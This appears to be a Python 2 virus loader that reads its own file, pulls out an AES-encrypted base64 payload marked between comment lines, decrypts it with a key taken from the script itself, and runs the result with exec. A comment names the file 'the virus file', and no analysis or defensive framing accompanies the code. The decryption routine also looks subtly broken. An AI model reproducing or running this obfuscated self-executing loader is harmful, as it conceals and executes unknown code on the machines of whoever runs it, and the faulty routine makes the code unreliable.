print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload